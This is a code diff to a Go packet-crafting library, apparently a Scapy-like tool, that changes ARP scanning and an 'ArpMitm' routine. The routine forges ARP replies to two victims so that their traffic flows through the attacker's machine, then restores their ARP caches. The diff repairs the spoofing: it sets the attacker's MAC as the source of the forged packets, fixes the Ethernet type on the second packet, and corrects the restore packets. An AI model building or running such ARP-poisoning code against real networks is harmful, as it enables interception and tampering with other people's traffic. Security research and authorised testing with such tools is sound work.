@@ -14,12 +14,9 @@ import (
 
 func ARPScan(iface string, targetIP string) (string, error) {
 	// Get MAC address of interface
-	srcMAC, err := utils.MacByInt(iface)
-	if err != nil {
-		return "", err
-	}
+	srcMAC := utils.MacByInt(iface)
 	// Get IP address of interface
-	srcIP := utils.ParseIPGen(iface)
+	srcIP := utils.IPbyInt(iface)
 	// Create a new SuperSocket
 	ss, err := supersocket.NewSuperSocket(iface, "")
 	if err != nil {
@@ -91,14 +88,14 @@ func ArpMitm(iface, victim1, victim2 string) {
 	fmt.Println(macVictim1)
 	fmt.Println(macVictim2)
 
-	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2)
+	intMac := utils.MacByInt(iface)
+	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2, intMac)
 
 	for i := 0; i < 100; i++ {
 		ss.Send(arpPacket1)
+		time.Sleep(1 * time.Second)
 		ss.Send(arpPacket2)
 		fmt.Println("[*] Sending Fake ARPs")
-
-		time.Sleep(1 * time.Second)
 
 	}
 	fmt.Println("[*] Restoring original MAC")
@@ -107,26 +104,28 @@ func ArpMitm(iface, victim1, victim2 string) {
 
 }
 
-func restoreArp(macVictim1 string, victim1 string, victim2 string, macVictim2 string, err error, ss *supersocket.SuperSocket) {
+func restoreArp(macVictim1, victim1, victim2, macVictim2 string, err error, ss *supersocket.SuperSocket) {
 	ethLayer1 := packet.EthernetLayer()
 	ethLayer1.SetDstMAC(macVictim1)
+	ethLayer1.SetSrcMAC(macVictim2)
 	ethLayer1.SetEthernetType(layers.EthernetTypeARP)
 	arpPacketOriginal := packet.ARPLayer()
 	arpPacketOriginal.SetReply()
 	arpPacketOriginal.SetDstIP(victim1)
 	arpPacketOriginal.SetSrcIP(victim2)
+	arpPacketOriginal.SetSrcMac(macVictim2)
 	arpPacketOriginal.SetDstMac(macVictim1)
-	arpPacketOriginal.SetSrcIP(macVictim2)
 
 	ethLayer2 := packet.EthernetLayer()
 	ethLayer2.SetDstMAC(macVictim1)
+	ethLayer2.SetSrcMAC(macVictim2)
 	ethLayer2.SetEthernetType(layers.EthernetTypeARP)
 	arpPacketOriginal2 := packet.ARPLayer()
 	arpPacketOriginal2.SetReply()
 	arpPacketOriginal2.SetDstIP(victim2)
 	arpPacketOriginal2.SetSrcIP(victim1)
+	arpPacketOriginal2.SetSrcMac(macVictim2)
 	arpPacketOriginal2.SetDstMac(macVictim2)
-	arpPacketOriginal2.SetSrcIP(macVictim1)
 
 	OriginalArp1, err := packet.CraftPacket(ethLayer1.Layer(), arpPacketOriginal.Layer())
 	OriginalArp2, err := packet.CraftPacket(ethLayer2.Layer(), arpPacketOriginal2.Layer())
@@ -138,9 +137,10 @@ func restoreArp(macVictim1 string, victim1 string, victim2 string, macVictim2 st
 	ss.Send(OriginalArp2)
 }
 
-func CreateFakeArp(victim1 string, victim2 string, macVictim1 string, macVictim2 string) ([]byte, []byte) {
+func CreateFakeArp(victim1, victim2, macVictim1, macVictim2, srcMac string) ([]byte, []byte) {
 	ethLayer1 := packet.EthernetLayer()
 	ethLayer1.SetDstMAC(macVictim1)
+	ethLayer1.SetSrcMAC(srcMac)
 	ethLayer1.SetEthernetType(layers.EthernetTypeARP)
 	arpPacket1 := packet.ARPLayer()
 	arpPacket1.SetReply()
@@ -150,7 +150,8 @@ func CreateFakeArp(victim1 string, victim2 string, macVictim1 string, macVictim2
 
 	ethLayer2 := packet.EthernetLayer()
 	ethLayer2.SetDstMAC(macVictim2)
-	ethLayer1.SetEthernetType(layers.EthernetTypeARP)
+	ethLayer2.SetSrcMAC(srcMac)
+	ethLayer2.SetEthernetType(layers.EthernetTypeARP)
 	arpPacket2 := packet.ARPLayer()
 	arpPacket2.SetReply()
 	arpPacket2.SetDstIP(victim2)
